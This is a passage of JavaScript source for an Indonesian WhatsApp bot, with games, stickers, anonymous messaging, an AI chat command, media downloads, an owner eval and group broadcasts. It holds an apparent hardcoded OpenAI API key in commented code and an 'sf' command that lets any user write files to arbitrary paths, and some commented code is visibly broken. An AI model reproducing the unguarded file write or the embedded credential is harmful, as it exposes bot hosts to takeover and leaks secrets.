} catch (err){
console.log(err)
setReply("Aduh simi lagi error nih")
}
}
  

//Auto Sticker Online
if(db.data.sticker[budy]){ 
if (_spam.check("NotCase",senderNumber, AntiSpam)) return
_spam.add("NotCase",senderNumber, "5s", AntiSpam)
conn.sendMessage(from,{sticker:{url:db.data.sticker[budy].link}})
}

//Auto VN Online  
if(db.data.audio[budy]) {
if (_spam.check("NotCase",senderNumber, AntiSpam)) return 
let nono =  {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${pushname} \n「 ${db.data.audio[budy].name} 」 `,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
const iniQuoted = mentionByReply? m.quoted.fakeObj : nono 
conn.sendPresenceUpdate('composing', from)
conn.sendMessage(from, {audio: {url: db.data.audio[budy].link},ptt: true, waveform:  [
0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  9,
35, 51, 67, 73, 73, 25, 18, 58, 75, 72, 26,  0,
27, 56, 58, 43, 12, 23, 35, 49, 62, 67, 63, 18,
2, 16, 39, 45, 43, 31, 21, 36, 57, 71, 70, 67,
23, 49, 36,  6, 17, 39, 50, 52, 45, 27, 26, 50,
51, 49, 49, 49
], mimetype: 'audio/mpeg'}, {quoted: iniQuoted }) 
_spam.add("NotCase",senderNumber, "5s", AntiSpam)
}



//Game Family 100
conn.family = conn.family ? conn.family : {}
if(isGroup && from in conn.family){
let similarity = require('similarity')
let threshold = 0.72 // semakin tinggi nilai, semakin mirip
let id =  m.chat
let room = conn.family[id]
let text = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurrender = /^((me)?nyerah|surr?ender)$/i.test(budy)
if (!isSurrender) {
let index = room.jawaban.indexOf(text)
if (index < 0) {
if (Math.max(...room.jawaban.filter((_, index) => !room.terjawab[index]).map(jawaban => similarity(jawaban,text))) >= threshold) return setReply('Dikit lagi!')
}
if (!isCmd && room.terjawab[index]) {return} 
room.terjawab[index] = m.sender
user.balance += room.winScore
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `
*Soal:* ${room.soal}

Terdapat *${room.jawaban.length}* jawaban${room.jawaban.find(v => v.includes(' ')) ? `
(beberapa jawaban terdapat spasi)
`: ''}
${isWin ? `*SEMUA JAWABAN TERJAWAB*` : isSurrender ? '*MENYERAH!*' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
 return isSurrender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
 }).filter(v => v).join('\n')}

${isSurrender ? '' : `+${room.winScore} Money tiap jawaban benar`}
    `.trim()

setReply(caption, await conn.parseMention(caption)).then(msg => {
 conn.family[id].msg = msg
}).catch(_ => _)
if (isWin || isSurrender) delete conn.family[id] 

}


//GAME MATH FUNCTION
conn.math = conn.math ? conn.math : {}
if(isGroup && from in conn.math){
//console.log(conn.math)
try{
let id = from
if (!(id in conn.math) && /^apa hasil dari/i.test(budy)) return setReply('soal itu sudah berakhir')
let math = JSON.parse(JSON.stringify(conn.math[id][1]))
if (budy == math.result) {
user.balance += math.bonus
clearTimeout(conn.math[id][3])
delete conn.math[id]
await setReply(` benar\n\nSaldo: Rp${math.bonus}\n\nmath ${math.mode}`)
} else {    
if (--conn.math[id][2] == 0) {
clearTimeout(conn.math[id][3])
delete conn.math[id]
setReply(`*kesempatan habis!*\njawabannya adalah *${math.result}*`)
} else setReply(`*jawaban salah!*\nmasih ada ${conn.math[id][2]} kesempatan`)
}
}catch(err){
console.log(err)
}
}


//GAME Caklontong Function
conn.caklontong = conn.caklontong ? conn.caklontong : {}  
if(isGroup && from in conn.caklontong){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let json = JSON.parse(JSON.stringify(conn.caklontong[id][1]))
if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
global.db.data.users[m.sender].exp += conn.caklontong[id][2]
// global.db.data.users[m.sender].tiketcoin += 1
setReply(`*Benar!*\n+${conn.caklontong[id][2]} XP\n+1 TiketCoin\n${json.deskripsi}`)
clearTimeout(conn.caklontong[id][3])
delete conn.caklontong[id]
} else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
else setReply(`*Salah!*`)
 
}




//NEW ANTI SPAM
conn.spam = conn.spam ? conn.spam : {}
let chat = global.db.data.chats[m.chat]
if (chat && chat.antispam) {
if (m.sender in conn.spam) {
conn.spam[m.sender].count++
if (m.messageTimestamp.toNumber() - conn.spam[m.sender].lastspam > 10) {
if (conn.spam[m.sender].count > 10) {
//global.db.data.users[m.sender].banned = true
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? conn.user.jid : m.sender
let caption = `Kamu telah di banned *@${who.split("@")[0]}* karena melakukan spam, Jangan spam kak!`
setReply(caption,conn.parseMention(caption) )
  //conn.sendButton(m.chat, caption, wm, null, [['Matikan AntiSpam', '/disable antispam']], m, { mentions: conn.parseMention(caption) })
}
conn.spam[m.sender].count = 0
conn.spam[m.sender].lastspam = m.messageTimestamp.toNumber()
}
} else conn.spam[m.sender] = {
jid: m.sender,
count: 0,
lastspam: 0
}
}

  
  

//Auto Hit 
_data.expiredCmd(hitnya, dash)
const thisHit = `${_data.getHit("run", hitnya)}` 
if(isCmd){
db.data.users[sender].hit += 1
_data.cmdAdd("run", "1d", hitnya)
_data.Succes(toFirstCase(command), dash, allcommand)
}



try{
switch(command) {

case 'menu':{
const { allmenu, fitur} = (await import('./help.js'))
let menunya = allmenu(limitCount, isPremium,thisHit, publik, sender, prefix, pushname)
let fiturnya = fitur(prefix)
let options11 =
{forwardingScore: 50, 
isForwarded: true, 
externalAdReply: {
showAdAttribution: true,
title: fake,
body: copyright,
//description: 'Now Playing...',
mediaType: 1,
renderLargerThumbnail : true,
thumbnail: thumb,
sourceUrl: `https://wa.me/${nomerOwner}`
}
}
const contextInfo = {
mentionedJid: [m.sender],
externalAdReply:{
title: `${week} , ${calender}ㅤㅤㅤㅤㅤㅤㅤㅤㅤ`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumbs,
sourceUrl:`https://chat.whatsapp.com/Bd2mN13f4QV7Mu1vtZ0NuP`,
}
}  

conn.sendMessage(from, { contextInfo, text: menunya+readmore+"\n"+fiturnya },{quoted: m})
} 
break
/*
case 'menu':{
const { allmenu, fitur} = (await import('./help.js'))
let menunya = allmenu(limitCount, isPremium,thisHit, publik, sender, prefix, pushname)
let fiturnya = fitur(prefix)
let mok = [
{"buttonId": `${prefix}dashboard`,"buttonText": {"displayText": `Dashboard`},"type": "RESPONSE"},
{"buttonId": `${prefix}contactowner`,"buttonText": {"displayText": `OwnerContact`},"type": "RESPONSE"},
]

const muk = [

{urlButton: {
displayText: `Owner Number`,
url: `https://wa.me/${nomerOwner}`
}},
{ quickReplyButton: { displayText: `Dashboard`, id: `${prefix}dashboard` } },
{ quickReplyButton: { displayText: `OwnerContact`, id: `${prefix}contactowner` } }

]

const templateButtons = [
{index: 1, urlButton: {displayText: ' S U B S ▶️ ', url: 'https://youtube.com/@RamaGans'}},
{index: 1, urlButton: {displayText: ' G R U P 👥 ', url: 'https://chat.whatsapp.com/Bd2mN13f4QV7Mu1vtZ0NuP'}},
/*{index: 2, callButton: {displayText: 'Call me 📞', phoneNumber: `${ownerNUM}`}},
{index: 3, quickReplyButton: {displayText: ` C O M M A N D ☘️ `, id: `${prefix}menuallm` }},
]

let options1 =
{forwardingScore: 50, 
isForwarded: true, 
externalAdReply: {
showAdAttribution: true,
title: fake,
body: copyright,
//description: 'Now Playing...',
mediaType: 1,
renderLargerThumbnail : true,
thumbnail: thumb,
sourceUrl: `https://wa.me/${nomerOwner}`
}
}
if(setmenu == "document"){
let dok = "https://tinyurl.com/29yvnsgq"
conn.sendButDoc(from, menunya,readmore+fiturnya,fs.readFileSync('./stik/thumbnaildokumen.jpg'), mok, {forwardingScore: 50, isForwarded: true,},{quoted: setQuoted})

} else if(setmenu == "location"){
conn.sendButLoc(from, menunya,"                      "+readmore+fiturnya+"\n"+copyright,fs.readFileSync('./stik/thumb.jpeg'), mok, options1)
} else if(setmenu == "image"){
conn.sendButImage(from, menunya, readmore+fiturnya, fs.readFileSync('./stik/thumb.jpeg'),mok)
} else if(setmenu == "image2"){
conn.send5ButImg (from, menunya+readmore+"\n"+fiturnya,copyright, fs.readFileSync('./stik/thumb.jpeg'), muk)
} else if(setmenu == "gif"){
conn.send5ButGif (from, menunya+readmore+"\n"+fiturnya,copyright, fs.readFileSync('./stik/video.mp4'), templateButtons,{quoted: m})
} else if(setmenu == "location2"){
conn.send5ButLoc(from, menunya,copyright, fs.readFileSync('./stik/thumb.jpeg'), templateButtons)
} else if(setmenu == "katalog"){
conn.sendKatalog(from, "ALL MENU BOT", menunya+readmore+"\n"+fiturnya, fs.readFileSync('./stik/thumb.jpeg'), {quoted: setQuoted})
  } else if(setmenu == "troli"){
	let template = await generateWAMessageFromContent(from, {
'orderMessage': {
'orderId': '62887435047326@s.whatsapp.net',
'thumbnail': fs.readFileSync('./stik/thumb.jpg'),
'itemCount': "2022",
'title': "title",
'description': "description",
'status': 1,
'surface': 1,
'message':menunya+readmore+"\n"+fiturnya,
'orderTitle': wm
}
}, {
'quoted': setQuoted
});
 conn.relayMessage(from, template.message,{ messageId: template.key.id })
} 
}
break
    case 'menuallm':{
const { allmenu, fitur} = (await import('./help.js'))
let menunya = allmenu(limitCount, isPremium,thisHit, publik, sender, prefix, pushname)
let fiturnya = fitur(prefix)
let options11 =
{forwardingScore: 50, 
isForwarded: true, 
externalAdReply: {
showAdAttribution: true,
title: fake,
body: copyright,
//description: 'Now Playing...',
mediaType: 1,
renderLargerThumbnail : true,
thumbnail: thumb,
sourceUrl: `https://wa.me/${nomerOwner}`
}
}

 conn.sendMessage(from, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `${week} , ${calender}ㅤㅤㅤㅤㅤㅤㅤㅤㅤ`,
body:`\t\t⌜ ${ucapanWaktu} ⌟\t\t`,
previewType:"PHOTO",
thumbnail: fs.readFileSync('./stik/web.jpg'),
sourceUrl: `${global.link}`,
}}, text: fiturnya}, { quoted: m })  
 }
 break*/
    case 'gimage':
case 'image':{
if (!isGroup) return setReply(mess.only.group)
if (args.length < 1) return setReply('Apa yang mau dicari ?')
try{
const {googleImage} = await import('@bochilteam/scraper')
googleImage(q).then(async (data) => {
//console.log(data)
let foto = data[Math.floor(Math.random() * data.length)]
if(data.length == "0") return setReply("Image tidak di temukan")
xdev.sendMedia (from, foto, dev, {caption: "*[️ SUCCES ]*"})
})
} catch(err){
let teks = args.join(' ')
let res = await gis(teks, google)
function google(error, result){
if (error){ return setReply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')}
else {
var gugIm = result
var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
xdev.sendMedia (from, random, dev, {caption:  `*Hasil Pencarian Dari :* ${teks}`})
}
}
}
}
break
    case 'setbio':   
 {
if (!isOwner && !itsMe) return setReply("Khusus Owner")
if (!q) return setReply(`Kirim perintah ${prefix+command} nama\n\nContoh : ${command} Paijo`)
await conn.updateProfileStatus(q)
await setReply(`Berhasil mengganti status bio ke *${q}*`)
}
break
    case 'setimgthumb':{
if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
if(isImage || isQuotedImage){
let delb = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
await fse.copy(delb,`./stik/thumb.jpg`)
fs.unlinkSync(delb)
setReply(`Berhasil mengubah image thumb`)
} else {
setReply(`Kirim gambar dengan caption ${prefix}setthumb`);
}
}
break
    /*case 'brainly':{
 const { Brainly } = require("brainly-scraper-v2");
const brainly = new Brainly("id"); 
if (!q) setReply( 'Soalnya?')
let nana =`https://www.logosvgpng.com/wp-content/uploads/2018/04/brainly-logo-vector.png`
let foto = await getBuffer(nana)   
/*
try{
  var res = await brainly.search('id', q)
} catch (err) {
var res = await brainly.searchWithMT('id', `${q}`)
}
*//*
let res = await brainly.searchWithMT(`${q}`, `id`)
console.log(res)
let teks =`_*BRAINLY*_\n\n`


   teks += res.map(({ question, answers }, i) => `
_*PERTANYAAN KE ${i + 1}*_
${question.content}${answers.map((v, i) => `

*JAWABAN KE ${i + 1}*${v.verification ? ' (Verified)' : ''}${v.isBest ? ' (Terpilih)' : ''}
${v.content}`).join``}`).join(`
═════════════════
`)
 
 teks +=`\n\n_Thanks for choosing Brainly_`
 
let mok = [{"buttonId": `owner`,"buttonText": {"displayText": `Creator`},"type": "RESPONSE"}]
                   /*{"buttonId": `${prefix}donasi`,"buttonText": {"displayText": `Donasi`},"type": "RESPONSE"}]*/
/*conn.sendButImage(from, teks, `${fake1}`, foto, mok, {quoted: setQuoted})             

}
break*/
  case 'menfess':
case 'confess': {
if (isGroup) return setReply('Private chat only.')
if (args.length < 1) return setReply(`Penggunaan ${prefix + command} 62xxxx|pesan`)
if (args[0].startsWith('08')) return setReply('Awali nomor dengan 62')
var nomor = q.split("|")[0].replace(new RegExp("[()+-/ +/]", "gi"), "") 
var org = q.split("|")[1];
var dari = q.split("|")[2];
var buffer = await getBuffer(`https://telegra.ph/file/67484c90d3d59643760bd.jpg`)
let mok = [{buttonId: `y`, buttonText: { displayText: "Siapa Ya" }, type: 1 }]
let teks = `Hai kak, kamu dapat Pesan rahasia nihh gak tau dari siapa!!\n\n*Pesan dia :* ${org}\n\n─────────────────────────\n_Jika tidak ingin membalasnya ? Ketik : *.keluar*_`

let options2 = { 
externalAdReply: {
showAdAttribution: true, 
title: `${week} , ${calender}`,
//body: copyright,
//description: 'Now Playing...',
mediaType: 1,  
renderLargerThumbnail : true,
thumbnail: fs.readFileSync('./stik/thumb.jpg'),
//mediaUrl: `https://m.facebook.com/`,
sourceUrl: `https://wa.me/6282139103669`
}
}
var input = nomor+'@s.whatsapp.net'
let ap = q.replace("|")[0]
//if(!ap.startsWith("+62")) return setReply("Masukan dengan benar. contoh: .menfess +62851xnxx|dari siapa|isi pesannya")
let id = + new Date
const obj = {
id,
a: m.sender,
b: input,
state: "CHATTING",
expired: "INFINITY"
}
anonChat.push(obj)
await xdev.sendMessage(nomor+'@s.whatsapp.net', {text: teks,image: buffer, mok})
/*xdev.sendButDoc(nomor+'@s.whatsapp.net', teks,`Tekan tombol untuk membalas chat`,fs.readFileSync('./stik/thumb.jpg'), mok ,options2)*/
let repli = `*Berhasil mengirim pesan ke nomer ${nomor}*\n❌ Jangan Lupa Jika tidak dibalas ketik *${prefix}keluar*`
let repli2 = `_Sekarang kamu dapat mengirim chat_`
//reply(repli)
reply(repli)
//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat)
anonChat.splice(anonChat.indexOf(roomA, 1))
}
break
    case 'unbanchat':{
if (!isOwner) return onlyOwner()
if (!isGroup) return setReply(mess.only.group)
if (isBanchat) return setReply(`Okok`)
db.data.chats[from].banchat = false
setReply(`Bot bisa di gunakan kembali`)
}
break
  case 'ai':{
    const { Configuration, OpenAIApi } = await import("openai");
    if (!q) return reply(`Chat dengan AI.\n\nContoh:\n${prefix}${command} Apa itu resesi`);
            const configuration = new Configuration({
              apiKey: global.apiai,
            });
            const openai = new OpenAIApi(configuration)
            const response = await openai.createCompletion({
          model: "gpt-3.5-turbo",
          messages: [{role: "user", content: q}],
          });
          setReply(`${response.data.choices[0].message.content}`);
}
break
/*const configuration = new Configuration({
  apiKey: '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',
});
const openai = new OpenAIApi(configuration);

const completion = await openai.createCompletion({
  model: "text-davinci-003",
  prompt: q,
  temperature: 0.3,                 max_tokens: 3000,
  top_p: 1.0,
  frequency_penalty: 0.0,
  presence_penalty: 0.0,
});
setReply(completion.data.choices[0].text);*/
  /*case 'ai'
ai = require("openai")

var configuration = new ai.Configuration({
                            apiKey: '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',
                        });
const openai = new ai.OpenAIApi(configuration);
                    
const response = await openai.createCompletion({
                            model: "text-davinci-003",
                            prompt: q,
                            temperature: 0.3,
                            max_tokens: 3000,
                            top_p: 1.0,
                            frequency_penalty: 0.0,
                            presence_penalty: 0.0,
                        });
                        return response.data.choices[0].text
  
    break*/
  case 'sf':{
    if (!q) return setReply (`uhm.. teksnya mana?\n\npenggunaan:\n${prefix + command} <teks>\n\ncontoh:\n${prefix + command} index.js`)
    if (!m.quoted.text) throw `balas pesan nya!`
    let path = `${q}`
    await fs.writeFileSync(path, m.quoted.text)
    m.reply(`tersimpan di ${path}`)
  }
    break
case 'setgif':{
if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
if(isImage || isQuotedImage){
let delb = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
await fse.copy(delb,`./stik/video.mp4`)
fs.unlinkSync(delb)
setReply(`Berhasil mengubah gif `)
} else {
setReply(`Kirim gambar dengan caption ${prefix}setgif`);
}
}
break
    
  case 'contactowner': case 'owner':{
    let senconTcv = async (jid, kon, quoted = '', opts = {}) => {
	let list = []
	for (let i of kon) {
	    list.push({
	    	displayName: await conn.getName(i + '@s.whatsapp.net'),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(i + '@s.whatsapp.net')}\nFN:${await conn.getName(i + '@s.whatsapp.net')}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Ponsel\nitem2.EMAIL;type=INTERNET:rgNZ@ymyh.com\nitem2.X-ABLabel:Email\nitem3.URL:http://bit.ly/Bot-W\nitem3.X-ABLabel:Instagram\nitem4.ADR:;;Indonesia;;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	conn.sendMessage(jid, { contacts: { displayName: `${list.length} Kontak`, contacts: list }, ...opts }, { quoted })
    }
              senconTcv(from, global.nomerCON, m)
            }
            break
  case 'sc': case 'script': case 'scriptbot':{
    setReply(`Sc bot ini \nhttps://safelink.id/0AHJFJVN\n`)
  }
    break

case 'play': 
case 'playmusic': 
case 'playmusik':
case 'ytmp3': 
case 'ytaudio': {
if(!q) return setReply("Kirim perintah judul lagu/link youtube")
let rus = await yts(q)
if(rus.all.length == "0") return setReply("Video tidak bisa di download")
let data = await rus.all.filter(v => v.type == 'video')
try{
var res = data[0]
var info = await ytdl.getInfo(res.url);
} catch{
var res = data[1]
var info = await ytdl.getInfo(res.url);
}
let audio = ytdl.filterFormats(info.formats, 'audioonly');
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
try{
var thumbnya =`https://i.ytimg.com/vi/${res.videoId}/hqdefault.jpg`
} catch(err) {
var thumbnya =`https://i.ytimg.com/vi/${res.videoId}/default.jpg`
}
let inithumb = await getBuffer(thumbnya)
let teks =`*─────〈〈️ YOUTUBE MP3 〉〉─────*

∘ Channel : ${res.author.name}
∘ Ditonton : ${h2k(res.views)} Kali 
∘ Durasi : ${res.timestamp}
∘ Upload : ${res.ago}
∘ Video : ${FileSize(format.contentLength)}
∘ Audio : ${FileSize(audio[0].contentLength)} 
∘ Judul : ${res.title}
∘ Url : ${res.url}
∘ Description : ${res.description}

_Tunnggu beberapa detik file *AUDIO* akan dikirim!_
`
xdev.sendMessage(from, { contextInfo: { externalAdReply: { showAdAttribution: true, 
title: `${week} , ${calender}`,//body: `© Hashira Botz`,//description: 'Fuck',//previewType:"PHOTO",
mediaType: 1,  
renderLargerThumbnail : true,
thumbnail: inithumb,
mediaUrl: res.url,
sourceUrl: res.url
}
}, image: {url: inithumb},text: teks},{quoted: dev})                                        
downloadMp3(`${res.url}`) 
}
break
    case 'bitly':{
    if (!isGroup) return setReply(mess.only.group)
if(!q) return setReply("Masukan link")
if(!isUrl) return setReply("Masukan link dengan benar")
try {
let result = await bitly.shorten(q);
setReply(`Link: ${result.link}\nCreated at: ${result.created_at}`)
} catch(e) {
setReply(`Url invalid`)
}
}
break;
case  'updategempa':{
if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
let dataGempa = db.data.others['updateGempa']
if(dataGempa == undefined ) db.data.others = ['updateGempa']
if(isGroup) {
if(!q) return setReply("Pilih on atau off")
if(q == "on"){
if(dataGempa.includes(from)) return setReply("Sudah aktif di group ini")
dataGempa.push(from)
setReply(`Berhasil menambahkan group ${groupName}  kedalam auto update gempa`)
} else if(q == "off"){
if(!dataGempa.includes(from)) return setReply("Sudah nonaktif di group ini")
dataGempa.splice(dataGempa.indexOf(from))
setReply(`Berhasil menonaktifkan group ${groupName}  kedalam auto update gempa`)
}


} else {
if(!q) return setReply("Masukin idgc")
if(!q.includes("@g.us") ) return setReply("Masukan id")
if(db.data.others['updateGempa'].includes(from)) return setReply("Sudah aktif")
db.data.others['updateGempa'].push(q)
setReply(`Berhasil menambahkan  ${q}  kedalam auto update gempa`)
}
}
break
    /*case 'bucin':{
if (!isGroup) return setReply(mess.only.group)
const sa = ngebucin[Math.floor(Math.random() * ngebucin.length)]
xdev.sendMessage(from, { text: ''+sa+'\n\n-- Bucin'}, { quoted: dev })
}
break
case 'katailham': {
if (!isGroup) return setReply(mess.only.group)
const afa = ilhamberkata[Math.floor(Math.random() * ilhamberkata.length)]
xdev.sendMessage(from, { text: ''+afa+'\n\n-- Ilham Nih'}, { quoted: dev })
}
break
case 'katabijak': {
if (!isGroup) return setReply(mess.only.group)
const afa = katabijak[Math.floor(Math.random() * katabijak.length)]
xdev.sendMessage(from, { text: ''+afa+'\n\n-- Bijak'}, { quoted: dev })
}
break
case 'katagalau': {
if (!isGroup) return setReply(mess.only.group)
const afa = katagalau[Math.floor(Math.random() * katagalau.length)]
xdev.sendMessage(from, { text: ''+afa+'\n\n-- Galau'}, { quoted: dev })
}
break	
case 'fakta': {
if (!isGroup) return setReply(mess.only.group)
const afa = fakta[Math.floor(Math.random() * fakta.length)]
xdev.sendMessage(from, { text: ''+afa+'\n\n-- Fakta'}, { quoted: dev })
}
break*/
  case 'quotesanime': 
  case 'quotes':
case 'quoteanime': {
if (!isGroup) return setReply(mess.only.group)
/*var { quotesAnime } =  await import('../lib/scraper.js')*/
let anu = await quotesAnime()
let result = anu[Math.floor(Math.random() * anu.length)]
let buttons = [
{buttonId: `${prefix}quotesanime`, buttonText: {displayText: 'Next'}, type: 1}]
let buttonMessage = {
text: `*─────〈〈️ QUOTES 〉〉─────*\n\n~ _${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n`,
}
xdev.sendMessage(from, buttonMessage, { quoted: dev })
}
break  
	    /*case 'jadianime': case 'toanime':{
        try{
let q = m.quoted ? m.quoted : m
let mime = (q.msg || q).mimetype || ''
if (!/image\/(jpe?g|png)/.test(mime)) return conn.reply(m.chat, `Kirim gambar dengan caption atau reply ${prefix + command}`, m)
const ai2d = await import('@arugaz/ai2d')
let img = await q.download()
if (!img) return conn.reply(m.chat,  `Kirim gambar dengan caption atau reply ${prefix + command}`, m)
setReply(mess.wait)
let image = await uploadSCRAP(img)
await ai2d(image, {
proxy: {
url: "http://101.32.184.53:3128",
chinese: true,
image: false,
},
}).then(async (h) => {
            //if (!result || result.constructor.name != 'String') return conn.reply(m.chat, global.status.fail, m)
conn.sendFile(m.chat, h, ``, `*Kawai :v*`, m)
})        
 } catch (e) {
 console.log(e)
  return conn.reply(m.chat, 'Error Mungkin ada kesalahan pas pengeditan gambar', m)
      }
}
break*/
case 's':
case 'sticker':
  case 'stiker':
  case 'stik':
if (isImage || isQuotedImage || isVideo || isQuotedVideo) {
if (quoted.seconds > 11) return m.reply('Maksimal 10 detik!')
let kualitas = isImage? 70 : 2
let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
let jancok = new Sticker(media, {
pack: packName, // The pack name
author: authorName, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: kualitas, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await conn.sendMessage(from,{sticker: nah},{quoted: m})
await fs.unlinkSync(stok)
await fs.unlinkSync(media)
} else {
setReply(`Kirim gambar/vidio dengan caption ${command} atau balas gambar/vidio yang sudah dikirim\nNote : Maximal vidio 10 detik!`)
}
break
    case 'get':{
if (!args[0])  return reply ('link fotonya mana tuan')
conn.sendMessage(from, {image: {url: args[0]},caption: mess.success}, {quoted: m})
}
break 
case 'speed':
setReply(`Speed: ${latensi.toFixed(4)} Second`)
break   
		   
case 'runtime':{
let data = global.db.data.others['runtime']
let time = (new Date - data.runtime) || 'lamanya'
let teks =`
🕦 System aktif selama ${runtime(process.uptime())}
⏰ Bot aktif selama ${clockString(time)}
`
setReply(teks)
}
break
case 'apkdl':{
  try{
	if (!args[0]) return setReply(`Ex: ${prefix + command} https://play.google.com/store/apps/details?id=com.linecorp.LGGRTHN`)
	let res = await apkDl(args[0])
	await setReply(mess.wait)
	conn.sendMessage(m.chat, { document: { url: res.download }, mimetype: res.mimetype, fileName: res.fileName }, { quoted: m })
   } catch(err){
    setReply("TERJADI KESALAHAN SAAT MENGUNDUH APK")
  }
}
break
    /*case 'antilinkgc':{
if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
if (!isGroup) return setReply(mess.only.group)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
      if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (isAntilinkGc) return setReply('Fitur sudah aktif kak')
addDataId(from, command, DataId)
let ih =`Fitur antilink group telah di aktifkan`
setReply(ih)
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (!isAntilinkGc) return setReply('Udah mati')
removeDataId (command, from, DataId)
let ih =`Fitur antilink group telah di matikan`
setReply(ih)
}else if (!q) {
conn.sendButMessage(from, `MODE ANTI LINK GROUP`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}antilinkgc on`, buttonText: {displayText: `On` },type: 1},
{buttonId: `${prefix}antilinkgc off`, buttonText: { displayText: `Off` },type: 1}]);
 }
 }
break;  


case 'antilink':{
if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
if (!isGroup) return setReply(mess.only.group)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
  if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (isAntiLink) return setReply('Fitur sudah aktif kak')
addDataId(from, command, DataId)
let ih =`Fitur antilink telah di aktifkan`
setReply(ih)
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (!isAntiLink) return setReply('Fitur Anti link sudah off')
removeDataId (command, from, DataId)
let ih =`Fitur antilink telah di matikan`
setReply(ih)
} else if (!q) {
conn.sendButMessage(from, `MODE ANTI LINK`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}antilink on`, buttonText: {displayText: `On` },type: 1},
{buttonId: `${prefix}antilink off`, 6282142108243Text: { displayText: `Off` },type: 1}]);
}
}
break;     */ 
 /*case 'jadianime': case 'toanime':{
try{
let q = m.quoted ? m.quoted : m
let mime = (q.msg || q).mimetype || ''
if (!/image\/(jpe?g|png)/.test(mime)) return conn.reply(m.chat, Func.texted('bold', `Kirim gambar dengan caption atau reply ${isPrefix + command}`), m)
let img = await q.download()
if (!img) return conn.reply(m.chat, Func.texted('bold', `Kirim gambar dengan caption atau reply ${isPrefix + command}`), m)
let image = await scrap.uploadImage(img)
await ai2d(image, {
   proxy: {
      url: "http://101.32.184.53:3128",
      chinese: true,
      image: false,
   },
}).then(async (h) => {
//if (!result || result.constructor.name != 'String') return conn.reply(m.chat, global.status.fail, m)
conn.sendFile(m.chat, h, ``, `*Anjai jadi Animeh :v*`, m)
           })
         }
 }
      } catch (e) {
         console.log(e)
         return conn.reply(m.chat, 'Error mungkin ada masalah', m)
      }
   }
   break  */ 
case  'del':
    case  'delete':
    case  'd':
if (!isGroup) return setReply('Kusus group')
//if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
if(!mentionByReply) return setReply("Reply pesan")
if (mentionByReply == botNumber) {
conn.sendMessage(from, { delete: { remoteJid: from, fromMe: true, id: dev.quoted.id, participant: mentionByReply } })
} else if(mentionByReply !== botNumber && isBotGroupAdmins){
conn.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: dev.quoted.id, participant: mentionByReply } })
} 
break
case 'ss':
if (!isGroup) return setReply(mess.only.group)
if(!q) return setReply("Masukan Link")
if(!isUrl(args[0]) && !args[0].includes('www.')) return reply("Link error");
let Url = `https://api.apiflash.com/v1/urltoimage?access_key=${apiflash}&wait_until=page_loaded&url=${q}`
conn.sendMessage(from,{image:{url: Url},caption:"Nih"},{quoted:m})
break  
  
//Eval.code
case '>': {
if (!isOwner) return setReply(mess.only.owner)
try {
let evaled = await eval(q)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}
break
case 'bcgcc':{
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return setReply('Teksnya?')
let getGroups = await conn.groupFetchAllParticipating()
let groupss = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anus = groupss.map(v => v.id)
let mem = [];
groupMembers.map( i => mem.push(i.id) )
setReply(`Mengirim Broadcast Ke ${anus.length} Chat, Waktu Selesai ${anus.length * 0.5 } detik`)
let teks = `*BROADCAST GROUP*\n\n${q}`

for (let i of anus) {
await sleep(1000)
await conn.sendMessage(i, { text: teks, mentions: mem })
}
